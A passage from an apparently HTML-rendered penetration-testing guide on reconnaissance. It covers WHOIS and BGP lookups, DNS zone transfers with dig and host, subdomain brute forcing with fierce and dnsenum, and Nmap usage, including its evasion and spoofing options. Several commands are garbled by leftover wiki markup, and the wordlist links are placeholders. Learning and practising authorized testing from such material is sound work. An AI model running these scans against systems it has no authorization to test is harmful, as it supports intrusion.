<p>Once the appropriate Registrar was queried we can obtain the Registrant
information. There are numerous sites that offer WHOIS information;
however for accuracy in documentation, you need to use only the
appropriate Registrar.</p>
<ul class="simple">
<li>InterNIC - <a class="reference external" href="http://www.internic.net/">http://www.internic.net/</a> <a class="reference external" href="http://www.internic.net">http://www.internic.net</a>]</li>
</ul>
</div>
<div class="section" id="bgp-looking-glasses">
<h5>BGP looking glasses<a class="headerlink" href="#bgp-looking-glasses" title="Permalink to this headline">¶</a></h5>
<p>It is possible to identify the Autonomous System Number (ASN) for
networks that participate in Border Gateway Protocol (BGP). Since BGP
route paths are advertised throughout the world we can find these by
using a BGP4 and BGP6 looking glass.</p>
<ul class="simple">
<li>BGP4 -
<a class="reference external" href="http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">http</a><a class="reference external" href="http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">://</a><a class="reference external" href="http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">www</a><a class="reference external" href="http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">.</a><a class="reference external" href="http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">bgp</a><a class="reference external" href="http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">4.</a><a class="reference external" href="http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">as</a><a class="reference external" href="http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">/</a><a class="reference external" href="http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">looking</a><a class="reference external" href="http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">-</a><a class="reference external" href="http://www.google.com/url?q=http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">glasses</a></li>
<li>BPG6 - <a class="reference external" href="http://lg.he.net/">http://lg.he.net/</a></li>
</ul>
</div>
</div>
<div class="section" id="active-reconnaissance">
<h4>Active Reconnaissance<a class="headerlink" href="#active-reconnaissance" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li>Manual browsing</li>
<li>Google Hacking -
<a class="reference external" href="http://www.exploit-db.com/google-dorks">http://www.exploit-db.com/google-dorks</a></li>
</ul>
</div>
<div class="section" id="passive-reconnaissance">
<h4>Passive Reconnaissance<a class="headerlink" href="#passive-reconnaissance" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li>Google Hacking -
<a class="reference external" href="http://www.exploit-db.com/google-dorks">http://www.exploit-db.com/google-dorks</a></li>
</ul>
</div>
<div class="section" id="active-footprinting">
<h4>Active Footprinting<a class="headerlink" href="#active-footprinting" title="Permalink to this headline">¶</a></h4>
<p>The active footprinting phase of Intelligence Gathering involves
gathering response results from a target based upon direct interaction.</p>
<div class="section" id="zone-transfers">
<h5>Zone Transfers<a class="headerlink" href="#zone-transfers" title="Permalink to this headline">¶</a></h5>
<p>DNS zone transfer, also known as AXFR, is a type of DNS transaction. It
is a mechanism designed to replicate the databases containing the DNS
data across a set of DNS servers. Zone transfer comes in two flavors,
full (AXFR) and incremental (IXFR). There are numerous tools available
to test the ability to perform a DNS zone transfer. Tools commonly used
to perform zone transfers are host, dig, and nmap.</p>
<p>Host</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">host</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">domain</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">DNS</span> <span class="n">server</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>Dig</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">dig</span> <span class="nd">@server</span> <span class="n">domain</span> <span class="n">axfr</span>
</pre></div>
</div>
</div>
<div class="section" id="reverse-dns">
<h5>Reverse DNS<a class="headerlink" href="#reverse-dns" title="Permalink to this headline">¶</a></h5>
<p>Reverse DNS can be used to obtain valid server names in use within an
organizational. There is a caveat that it must have a PTR (reverse) DNS
record for it to resolve a name from a provided IP address. If it does
resolve then the results are returned. This is usually performed by
testing the server with various IP addresses to see if it returns any
results.</p>
</div>
<div class="section" id="dns-bruting">
<h5>DNS Bruting<a class="headerlink" href="#dns-bruting" title="Permalink to this headline">¶</a></h5>
<p>After identifying all the information that is associated with the client
domain(s), it is now time to begin to query DNS. Since DNS is used to
map IP addresses to hostnames, and vice versa we will want to see if it
is insecurely configure. We will seek to use DNS to reveal additional
information about the client. One of the most serious misconfigurations
involving DNS is allowing Internet users to perform a DNS zone transfer.
There are several tools that we can use to enumerate DNS to not only
check for the ability to perform zone transfers, but to potentially
discover additional host names that are not commonly known.</p>
<p>Fierce2 (Linux)</p>
<p>For DNS enumeration, there are two tools that are utilized to provide
the desired results. The first that we will focus on is named Fierce2.
As you can probably guess, this is a modification on Fierce. Fierce2 has
lots of options, but the one that we want to focus on attempts to
perform a zone transfer. If that is not possible, then it performs DNS
queries using various server names in an effort to enumerate the host
names that have been registered.</p>
<div class="line-block">
<div class="line">The command to run <em>fierce2</em> is as follows:</div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">fierce</span> <span class="o">-</span><span class="n">dns</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">client</span> <span class="n">domain</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">prefix</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">wordlist</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_29.png">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>There is a common prefix (called common-tla.txt) wordlist that has been
composed to utilize as a list when enumerating any DNS entries. This can
be found at the following URL:</p>
<blockquote>
<div><a class="reference external" href="https://address-unknown/">https://address-unknown/</a></div></blockquote>
<p>DNSEnum (Linux)</p>
<p>An alternative to Fierce2 for DNS enumeration is DNSEnum. As you can
probably guess, this is very similar to Fierce2. DNSEnum offers the
ability to enumerate DNS through brute forcing subdomains, performing
reverse lookups, listing domain network ranges, and performing whois
queries. It also performs Google scraping for additional names to query.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_30.png">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<div class="line-block">
<div class="line">The command to run <em>dnsenum</em> is as follows:</div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">dnsenum</span> <span class="o">-</span><span class="n">enum</span> <span class="o">-</span><span class="n">f</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">wordlist</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">client</span> <span class="n">domain</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_31.png">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>Again, there is a common prefix wordlist that has been composed to
utilize as a list when enumerating any DNS entries. This can be found at
the following URL:</p>
<blockquote>
<div><a class="reference external" href="https://address-unknown/">https://address-unknown/</a></div></blockquote>
<p>Dnsdict6 (Linux)</p>
<p>Dnsdict6, which is part of the THC IPv6 Attack Toolkit, is an IPv6 DNS
dictionary brute forcer. The options are relatively simple, but simply
specify the domain and a dictionary-file.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_32.png">Screenshot Here</a></p>
</div>
<div class="section" id="port-scanning">
<h5>Port Scanning<a class="headerlink" href="#port-scanning" title="Permalink to this headline">¶</a></h5>
<p>Nmap (Windows/Linux)</p>
<p>Nmap (&#8220;Network Mapper&#8221;) is the de facto standard for network
auditing/scanning. Nmap runs on both Linux and Windows. Nmap is
available in both command line and GUI versions. For the sake of this
document, we will only cover the command line.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Nmap</span> <span class="mf">5.51</span> <span class="p">(</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span>
<span class="n">Usage</span><span class="p">:</span> <span class="n">nmap</span> <span class="p">[</span><span class="n">Scan</span> <span class="n">Type</span><span class="p">(</span><span class="n">s</span><span class="p">)]</span> <span class="p">[</span><span class="n">Options</span><span class="p">]</span> <span class="p">{</span><span class="n">target</span> <span class="n">specification</span><span class="p">}</span>
<span class="n">TARGET</span> <span class="n">SPECIFICATION</span><span class="p">:</span>
  <span class="n">Can</span> <span class="k">pass</span> <span class="n">hostnames</span><span class="p">,</span> <span class="n">IP</span> <span class="n">addresses</span><span class="p">,</span> <span class="n">networks</span><span class="p">,</span> <span class="n">etc</span><span class="o">.</span>
  <span class="n">Ex</span><span class="p">:</span> <span class="n">scanme</span><span class="o">.</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="p">,</span> <span class="n">microsoft</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="mi">24</span><span class="p">,</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.1</span><span class="p">;</span> <span class="mf">10.0</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="mf">255.1</span><span class="o">-</span><span class="mi">254</span>
  <span class="o">-</span><span class="n">iL</span> <span class="o">&lt;</span><span class="n">inputfilename</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Input</span> <span class="kn">from</span> <span class="nn">list</span> <span class="n">of</span> <span class="n">hosts</span><span class="o">/</span><span class="n">networks</span>
  <span class="o">-</span><span class="n">iR</span> <span class="o">&lt;</span><span class="n">num</span> <span class="n">hosts</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Choose</span> <span class="n">random</span> <span class="n">targets</span>
  <span class="o">--</span><span class="n">exclude</span> <span class="o">&lt;</span><span class="n">host1</span><span class="p">[,</span><span class="n">host2</span><span class="p">][,</span><span class="n">host3</span><span class="p">],</span><span class="o">...&gt;</span><span class="p">:</span> <span class="n">Exclude</span> <span class="n">hosts</span><span class="o">/</span><span class="n">networks</span>
  <span class="o">--</span><span class="n">excludefile</span> <span class="o">&lt;</span><span class="n">exclude_file</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Exclude</span> <span class="nb">list</span> <span class="kn">from</span> <span class="nn">file</span>
<span class="n">HOST</span> <span class="n">DISCOVERY</span><span class="p">:</span>
  <span class="o">-</span><span class="n">sL</span><span class="p">:</span> <span class="n">List</span> <span class="n">Scan</span> <span class="o">-</span> <span class="n">simply</span> <span class="nb">list</span> <span class="n">targets</span> <span class="n">to</span> <span class="n">scan</span>
  <span class="o">-</span><span class="n">sn</span><span class="p">:</span> <span class="n">Ping</span> <span class="n">Scan</span> <span class="o">-</span> <span class="n">disable</span> <span class="n">port</span> <span class="n">scan</span>
  <span class="o">-</span><span class="n">Pn</span><span class="p">:</span> <span class="n">Treat</span> <span class="nb">all</span> <span class="n">hosts</span> <span class="k">as</span> <span class="n">online</span> <span class="o">--</span> <span class="n">skip</span> <span class="n">host</span> <span class="n">discovery</span>
  <span class="o">-</span><span class="n">PS</span><span class="o">/</span><span class="n">PA</span><span class="o">/</span><span class="n">PU</span><span class="o">/</span><span class="n">PY</span><span class="p">[</span><span class="n">portlist</span><span class="p">]:</span> <span class="n">TCP</span> <span class="n">SYN</span><span class="o">/</span><span class="n">ACK</span><span class="p">,</span> <span class="n">UDP</span> <span class="ow">or</span> <span class="n">SCTP</span> <span class="n">discovery</span> <span class="n">to</span> <span class="n">given</span> <span class="n">ports</span>
  <span class="o">-</span><span class="n">PE</span><span class="o">/</span><span class="n">PP</span><span class="o">/</span><span class="n">PM</span><span class="p">:</span> <span class="n">ICMP</span> <span class="n">echo</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">,</span> <span class="ow">and</span> <span class="n">netmask</span> <span class="n">request</span> <span class="n">discovery</span> <span class="n">probes</span>
  <span class="o">-</span><span class="n">PO</span><span class="p">[</span><span class="n">protocol</span> <span class="nb">list</span><span class="p">]:</span> <span class="n">IP</span> <span class="n">Protocol</span> <span class="n">Ping</span>
  <span class="o">-</span><span class="n">n</span><span class="o">/-</span><span class="n">R</span><span class="p">:</span> <span class="n">Never</span> <span class="n">do</span> <span class="n">DNS</span> <span class="n">resolution</span><span class="o">/</span><span class="n">Always</span> <span class="n">resolve</span> <span class="p">[</span><span class="n">default</span><span class="p">:</span> <span class="n">sometimes</span><span class="p">]</span>
  <span class="o">--</span><span class="n">dns</span><span class="o">-</span><span class="n">servers</span> <span class="o">&lt;</span><span class="n">serv1</span><span class="p">[,</span><span class="n">serv2</span><span class="p">],</span><span class="o">...&gt;</span><span class="p">:</span> <span class="n">Specify</span> <span class="n">custom</span> <span class="n">DNS</span> <span class="n">servers</span>
  <span class="o">--</span><span class="n">system</span><span class="o">-</span><span class="n">dns</span><span class="p">:</span> <span class="n">Use</span> <span class="n">OS</span><span class="s1">&#39;s DNS resolver</span>
  <span class="o">--</span><span class="n">traceroute</span><span class="p">:</span> <span class="n">Trace</span> <span class="n">hop</span> <span class="n">path</span> <span class="n">to</span> <span class="n">each</span> <span class="n">host</span>
<span class="n">SCAN</span> <span class="n">TECHNIQUES</span><span class="p">:</span>
  <span class="o">-</span><span class="n">sS</span><span class="o">/</span><span class="n">sT</span><span class="o">/</span><span class="n">sA</span><span class="o">/</span><span class="n">sW</span><span class="o">/</span><span class="n">sM</span><span class="p">:</span> <span class="n">TCP</span> <span class="n">SYN</span><span class="o">/</span><span class="n">Connect</span><span class="p">()</span><span class="o">/</span><span class="n">ACK</span><span class="o">/</span><span class="n">Window</span><span class="o">/</span><span class="n">Maimon</span> <span class="n">scans</span>
  <span class="o">-</span><span class="n">sU</span><span class="p">:</span> <span class="n">UDP</span> <span class="n">Scan</span>
  <span class="o">-</span><span class="n">sN</span><span class="o">/</span><span class="n">sF</span><span class="o">/</span><span class="n">sX</span><span class="p">:</span> <span class="n">TCP</span> <span class="n">Null</span><span class="p">,</span> <span class="n">FIN</span><span class="p">,</span> <span class="ow">and</span> <span class="n">Xmas</span> <span class="n">scans</span>
  <span class="o">--</span><span class="n">scanflags</span> <span class="o">&lt;</span><span class="n">flags</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Customize</span> <span class="n">TCP</span> <span class="n">scan</span> <span class="n">flags</span>
  <span class="o">-</span><span class="n">sI</span> <span class="o">&lt;</span><span class="n">zombie</span> <span class="n">host</span><span class="p">[:</span><span class="n">probeport</span><span class="p">]</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Idle</span> <span class="n">scan</span>
  <span class="o">-</span><span class="n">sY</span><span class="o">/</span><span class="n">sZ</span><span class="p">:</span> <span class="n">SCTP</span> <span class="n">INIT</span><span class="o">/</span><span class="n">COOKIE</span><span class="o">-</span><span class="n">ECHO</span> <span class="n">scans</span>
  <span class="o">-</span><span class="n">sO</span><span class="p">:</span> <span class="n">IP</span> <span class="n">protocol</span> <span class="n">scan</span>
  <span class="o">-</span><span class="n">b</span> <span class="o">&lt;</span><span class="n">FTP</span> <span class="n">relay</span> <span class="n">host</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">FTP</span> <span class="n">bounce</span> <span class="n">scan</span>
<span class="n">PORT</span> <span class="n">SPECIFICATION</span> <span class="n">AND</span> <span class="n">SCAN</span> <span class="n">ORDER</span><span class="p">:</span>
  <span class="o">-</span><span class="n">p</span> <span class="o">&lt;</span><span class="n">port</span> <span class="n">ranges</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Only</span> <span class="n">scan</span> <span class="n">specified</span> <span class="n">ports</span>
    <span class="n">Ex</span><span class="p">:</span> <span class="o">-</span><span class="n">p22</span><span class="p">;</span> <span class="o">-</span><span class="n">p1</span><span class="o">-</span><span class="mi">65535</span><span class="p">;</span> <span class="o">-</span><span class="n">p</span> <span class="n">U</span><span class="p">:</span><span class="mi">53</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">137</span><span class="p">,</span><span class="n">T</span><span class="p">:</span><span class="mi">21</span><span class="o">-</span><span class="mi">25</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">8080</span><span class="p">,</span><span class="n">S</span><span class="p">:</span><span class="mi">9</span>
  <span class="o">-</span><span class="n">F</span><span class="p">:</span> <span class="n">Fast</span> <span class="n">mode</span> <span class="o">-</span> <span class="n">Scan</span> <span class="n">fewer</span> <span class="n">ports</span> <span class="n">than</span> <span class="n">the</span> <span class="n">default</span> <span class="n">scan</span>
  <span class="o">-</span><span class="n">r</span><span class="p">:</span> <span class="n">Scan</span> <span class="n">ports</span> <span class="n">consecutively</span> <span class="o">-</span> <span class="n">don</span><span class="s1">&#39;t randomize</span>
  <span class="o">--</span><span class="n">top</span><span class="o">-</span><span class="n">ports</span> <span class="o">&lt;</span><span class="n">number</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Scan</span> <span class="o">&lt;</span><span class="n">number</span><span class="o">&gt;</span> <span class="n">most</span> <span class="n">common</span> <span class="n">ports</span>
  <span class="o">--</span><span class="n">port</span><span class="o">-</span><span class="n">ratio</span> <span class="o">&lt;</span><span class="n">ratio</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Scan</span> <span class="n">ports</span> <span class="n">more</span> <span class="n">common</span> <span class="n">than</span> <span class="o">&lt;</span><span class="n">ratio</span><span class="o">&gt;</span>
<span class="n">SERVICE</span><span class="o">/</span><span class="n">VERSION</span> <span class="n">DETECTION</span><span class="p">:</span>
  <span class="o">-</span><span class="n">sV</span><span class="p">:</span> <span class="n">Probe</span> <span class="nb">open</span> <span class="n">ports</span> <span class="n">to</span> <span class="n">determine</span> <span class="n">service</span><span class="o">/</span><span class="n">version</span> <span class="n">info</span>
  <span class="o">--</span><span class="n">version</span><span class="o">-</span><span class="n">intensity</span> <span class="o">&lt;</span><span class="n">level</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Set</span> <span class="kn">from</span> <span class="mi">0</span> <span class="p">(</span><span class="n">light</span><span class="p">)</span> <span class="n">to</span> <span class="mi">9</span> <span class="p">(</span><span class="k">try</span> <span class="nb">all</span> <span class="n">probes</span><span class="p">)</span>
  <span class="o">--</span><span class="n">version</span><span class="o">-</span><span class="n">light</span><span class="p">:</span> <span class="n">Limit</span> <span class="n">to</span> <span class="n">most</span> <span class="n">likely</span> <span class="n">probes</span> <span class="p">(</span><span class="n">intensity</span> <span class="mi">2</span><span class="p">)</span>
  <span class="o">--</span><span class="n">version</span><span class="o">-</span><span class="nb">all</span><span class="p">:</span> <span class="n">Try</span> <span class="n">every</span> <span class="n">single</span> <span class="n">probe</span> <span class="p">(</span><span class="n">intensity</span> <span class="mi">9</span><span class="p">)</span>
  <span class="o">--</span><span class="n">version</span><span class="o">-</span><span class="n">trace</span><span class="p">:</span> <span class="n">Show</span> <span class="n">detailed</span> <span class="n">version</span> <span class="n">scan</span> <span class="n">activity</span> <span class="p">(</span><span class="k">for</span> <span class="n">debugging</span><span class="p">)</span>
<span class="n">SCRIPT</span> <span class="n">SCAN</span><span class="p">:</span>
  <span class="o">-</span><span class="n">sC</span><span class="p">:</span> <span class="n">equivalent</span> <span class="n">to</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">default</span>
  <span class="o">--</span><span class="n">script</span><span class="o">=&lt;</span><span class="n">Lua</span> <span class="n">scripts</span><span class="o">&gt;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Lua</span> <span class="n">scripts</span><span class="o">&gt;</span> <span class="ow">is</span> <span class="n">a</span> <span class="n">comma</span> <span class="n">separated</span> <span class="nb">list</span> <span class="n">of</span>
           <span class="n">directories</span><span class="p">,</span> <span class="n">script</span><span class="o">-</span><span class="n">files</span> <span class="ow">or</span> <span class="n">script</span><span class="o">-</span><span class="n">categories</span>
  <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="o">=&lt;</span><span class="n">n1</span><span class="o">=</span><span class="n">v1</span><span class="p">,[</span><span class="n">n2</span><span class="o">=</span><span class="n">v2</span><span class="p">,</span><span class="o">...</span><span class="p">]</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">provide</span> <span class="n">arguments</span> <span class="n">to</span> <span class="n">scripts</span>
  <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">trace</span><span class="p">:</span> <span class="n">Show</span> <span class="nb">all</span> <span class="n">data</span> <span class="n">sent</span> <span class="ow">and</span> <span class="n">received</span>
  <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">updatedb</span><span class="p">:</span> <span class="n">Update</span> <span class="n">the</span> <span class="n">script</span> <span class="n">database</span><span class="o">.</span>
<span class="n">OS</span> <span class="n">DETECTION</span><span class="p">:</span>
  <span class="o">-</span><span class="n">O</span><span class="p">:</span> <span class="n">Enable</span> <span class="n">OS</span> <span class="n">detection</span>
  <span class="o">--</span><span class="n">osscan</span><span class="o">-</span><span class="n">limit</span><span class="p">:</span> <span class="n">Limit</span> <span class="n">OS</span> <span class="n">detection</span> <span class="n">to</span> <span class="n">promising</span> <span class="n">targets</span>
  <span class="o">--</span><span class="n">osscan</span><span class="o">-</span><span class="n">guess</span><span class="p">:</span> <span class="n">Guess</span> <span class="n">OS</span> <span class="n">more</span> <span class="n">aggressively</span>
<span class="n">TIMING</span> <span class="n">AND</span> <span class="n">PERFORMANCE</span><span class="p">:</span>
  <span class="n">Options</span> <span class="n">which</span> <span class="n">take</span> <span class="o">&lt;</span><span class="n">time</span><span class="o">&gt;</span> <span class="n">are</span> <span class="ow">in</span> <span class="n">seconds</span><span class="p">,</span> <span class="ow">or</span> <span class="n">append</span> <span class="s1">&#39;ms&#39;</span> <span class="p">(</span><span class="n">milliseconds</span><span class="p">),</span>
  <span class="s1">&#39;s&#39;</span> <span class="p">(</span><span class="n">seconds</span><span class="p">),</span> <span class="s1">&#39;m&#39;</span> <span class="p">(</span><span class="n">minutes</span><span class="p">),</span> <span class="ow">or</span> <span class="s1">&#39;h&#39;</span> <span class="p">(</span><span class="n">hours</span><span class="p">)</span> <span class="n">to</span> <span class="n">the</span> <span class="n">value</span> <span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">g</span><span class="o">.</span> <span class="mi">30</span><span class="n">m</span><span class="p">)</span><span class="o">.</span>
  <span class="o">-</span><span class="n">T</span><span class="o">&lt;</span><span class="mi">0</span><span class="o">-</span><span class="mi">5</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Set</span> <span class="n">timing</span> <span class="n">template</span> <span class="p">(</span><span class="n">higher</span> <span class="ow">is</span> <span class="n">faster</span><span class="p">)</span>
  <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">hostgroup</span><span class="o">/</span><span class="nb">max</span><span class="o">-</span><span class="n">hostgroup</span> <span class="o">&lt;</span><span class="n">size</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Parallel</span> <span class="n">host</span> <span class="n">scan</span> <span class="n">group</span> <span class="n">sizes</span>
  <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">parallelism</span><span class="o">/</span><span class="nb">max</span><span class="o">-</span><span class="n">parallelism</span> <span class="o">&lt;</span><span class="n">numprobes</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Probe</span> <span class="n">parallelization</span>
  <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rtt</span><span class="o">-</span><span class="n">timeout</span><span class="o">/</span><span class="nb">max</span><span class="o">-</span><span class="n">rtt</span><span class="o">-</span><span class="n">timeout</span><span class="o">/</span><span class="n">initial</span><span class="o">-</span><span class="n">rtt</span><span class="o">-</span><span class="n">timeout</span> <span class="o">&lt;</span><span class="n">time</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Specifies</span>
      <span class="n">probe</span> <span class="nb">round</span> <span class="n">trip</span> <span class="n">time</span><span class="o">.</span>
  <span class="o">--</span><span class="nb">max</span><span class="o">-</span><span class="n">retries</span> <span class="o">&lt;</span><span class="n">tries</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Caps</span> <span class="n">number</span> <span class="n">of</span> <span class="n">port</span> <span class="n">scan</span> <span class="n">probe</span> <span class="n">retransmissions</span><span class="o">.</span>
  <span class="o">--</span><span class="n">host</span><span class="o">-</span><span class="n">timeout</span> <span class="o">&lt;</span><span class="n">time</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Give</span> <span class="n">up</span> <span class="n">on</span> <span class="n">target</span> <span class="n">after</span> <span class="n">this</span> <span class="n">long</span>
  <span class="o">--</span><span class="n">scan</span><span class="o">-</span><span class="n">delay</span><span class="o">/--</span><span class="nb">max</span><span class="o">-</span><span class="n">scan</span><span class="o">-</span><span class="n">delay</span> <span class="o">&lt;</span><span class="n">time</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Adjust</span> <span class="n">delay</span> <span class="n">between</span> <span class="n">probes</span>
  <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="o">&lt;</span><span class="n">number</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Send</span> <span class="n">packets</span> <span class="n">no</span> <span class="n">slower</span> <span class="n">than</span> <span class="o">&lt;</span><span class="n">number</span><span class="o">&gt;</span> <span class="n">per</span> <span class="n">second</span>
  <span class="o">--</span><span class="nb">max</span><span class="o">-</span><span class="n">rate</span> <span class="o">&lt;</span><span class="n">number</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Send</span> <span class="n">packets</span> <span class="n">no</span> <span class="n">faster</span> <span class="n">than</span> <span class="o">&lt;</span><span class="n">number</span><span class="o">&gt;</span> <span class="n">per</span> <span class="n">second</span>
<span class="n">FIREWALL</span><span class="o">/</span><span class="n">IDS</span> <span class="n">EVASION</span> <span class="n">AND</span> <span class="n">SPOOFING</span><span class="p">:</span>
  <span class="o">-</span><span class="n">f</span><span class="p">;</span> <span class="o">--</span><span class="n">mtu</span> <span class="o">&lt;</span><span class="n">val</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">fragment</span> <span class="n">packets</span> <span class="p">(</span><span class="n">optionally</span> <span class="n">w</span><span class="o">/</span><span class="n">given</span> <span class="n">MTU</span><span class="p">)</span>
  <span class="o">-</span><span class="n">D</span> <span class="o">&lt;</span><span class="n">decoy1</span><span class="p">,</span><span class="n">decoy2</span><span class="p">[,</span><span class="n">ME</span><span class="p">],</span><span class="o">...&gt;</span><span class="p">:</span> <span class="n">Cloak</span> <span class="n">a</span> <span class="n">scan</span> <span class="k">with</span> <span class="n">decoys</span>
  <span class="o">-</span><span class="n">S</span> <span class="o">&lt;</span><span class="n">IP_Address</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Spoof</span> <span class="n">source</span> <span class="n">address</span>
  <span class="o">-</span><span class="n">e</span> <span class="o">&lt;</span><span class="n">iface</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Use</span> <span class="n">specified</span> <span class="n">interface</span>
